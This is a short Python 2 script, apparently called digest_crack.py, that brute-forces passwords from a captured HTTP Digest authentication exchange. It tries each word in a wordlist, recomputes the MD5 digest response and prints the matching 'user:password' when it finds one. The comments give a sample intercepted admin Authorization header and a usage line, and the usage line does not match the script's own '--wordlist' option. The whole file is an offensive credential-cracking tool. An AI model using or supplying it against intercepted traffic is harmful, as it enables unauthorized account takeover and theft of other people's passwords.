#!/usr/bin/env python

########## request example ########## 

# GET /index.html HTTP/1.1
# Host: 127.0.0.1:8080
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.52.7 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Referer: http://127.0.0.1:8080/SCRS/ID=1
# Accept-Language: en-us
# Accept-Encoding: gzip, deflate
# Authorization: Digest username="admin", realm="admin@admin.com", nonce="S6IiL53940DRSxIDXaAc2zzrD3dlKWHM", uri="/index.html", response="369926f3a91851a9a5ccc9c8672f9711", opaque="QZjf7gALm1I0ARTk7mfkyyCHtC4DPsTvaN", cnonce="8ceffa9ee35a73d072b97c661c96edc4", nc=00000001, qop="auth"
# Connection: keep-alive

########## script run example ########## 
# python digest_crack.py pass2crack --user admin --realm admin@admin.com --uri GET:/index.html --cnonce 8ceffa9ee35a73d072b97c661c96edc4 --nonce S6IiL53940DRSxIDXaAc2zzrD3dlKWHM --qop auth --nc 00000001 --res 369926f3a91851a9a5ccc9c8672f9711

import argparse
from hashlib import md5
from colorama import Fore as foreground


parser = argparse.ArgumentParser()
parser.add_argument('--wordlist',type=argparse.FileType('r'), help='password list')
parser.add_argument('--user', metavar='<username>',dest='username')
parser.add_argument('--realm', metavar='<realm>', dest='realm')
parser.add_argument('--uri', metavar='<method_uri>', dest='method_uri')
parser.add_argument('--cnonce', metavar='<cnonce>',dest='cnonce')
parser.add_argument('--nonce', metavar='<nonce>', dest='nonce')
parser.add_argument('--qop', metavar='<qop>',dest='qop')
parser.add_argument('--nc', metavar='<nc>',dest='nc')
parser.add_argument('--res', metavar='<response>', dest='response')
args = parser.parse_args()

user = args.username
words = args.wordlist.readlines()
realm = args.realm
method_uri = args.method_uri
qop = args.qop
cnonce = args.cnonce
nonce = args.nonce
nc = args.nc
response = args.response
hashlist = []
creds = []
def get_resp():
    print 'cracking...'
    #for user in ['user1','user2']:
    for passwd in words:
        print passwd
        hashl = md5("%s:%s:%s"%(user, realm, passwd.strip())).hexdigest()
        hash2 = md5(method_uri).hexdigest()
        resp = md5("%s:%s:%s:%s:%s:%s" % (hashl, nonce, nc, cnonce, qop, hash2)).hexdigest()
        if resp == response:
            print "#" * 25
            print "Cracked : " + foreground.GREEN + user + ":" + passwd + foreground.RESET
            print "#" * 25
            exit(0)
        else :
            print 'Tested hash value: %s' % resp

get_resp()
